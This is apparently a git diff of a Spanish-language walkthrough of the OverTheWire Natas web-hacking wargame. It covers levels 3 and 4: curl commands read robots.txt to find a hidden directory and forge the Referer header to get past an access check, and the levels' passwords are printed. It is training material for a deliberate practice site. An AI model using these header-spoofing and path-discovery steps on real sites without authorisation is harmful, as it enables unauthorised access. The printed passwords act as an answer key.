@@ -1,5 +1,5 @@
 
-Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python.
+Natas son retos de pentesting web de "Over-The-Wire". Yo voy a realizar los ejercicios usando scripting en python y bash
 Para resolver la pagina hay que encontrar la contraseña para autenticarse en el nivel siguiente con el usuario llamado igual que en nivel actual.
 
 ## (Natas0)[http://natas0.natas.labs.overthewire.org]
@@ -45,10 +45,37 @@ elementos que estan bajo dicha ruta, (entre ellas la foto de pixel.png) pero tam
 
 ## (Natas3)[http://natas3.natas.labs.overthewire.org]
 
+*Vulnerabilidad: rutas criticas en el robots.txt*
+
 Otro "no hay nada en esta web" en el navegador
 ```console
 [cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
 <!-- No more information leaks!! Not even Google will find it this time... -->
 ```
-Nos dice que no va a haber mas crendeciales filtradas, y que ni siquiera Google nos encontrará.
+Nos dice que no va a haber mas crendeciales filtradas, y que ni siquiera Google nos encontrará. Eso ultimo es una pista hacia la ruta "robots.txt"
+la cual evita que Google indexe/encuentre ciertas rutas sensibles.
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas3.natas.labs.overthewire.org/robots.txt" -u natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 
+User-agent: *
+Disallow: /s3cr3t/
+```
+Dicho "/s3cr3t" nos lleva a otro users.txt con las credenciales
+
+## (Natas4)[http://natas4.natas.labs.overthewire.org]
+
+*Restriccion: referrer limitado*
+
+Este nivel nos dice que solo acepta a gente que venga desde ```http://natas5.natas.labs.overthewire.org/```, es decir que desde esa página hayan pinchado en un link para venir a la actual. Esto se llama referrer. Con curl se puede esècificar dicho referrer con "-e"
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas4.natas.labs.overthewire.org" -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ \
+> -e http://natas5.natas.labs.overthewire.org/
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+```
+## (Natas5)[http://natas5.natas.labs.overthewire.org]
+
+
+
+
+
+
 
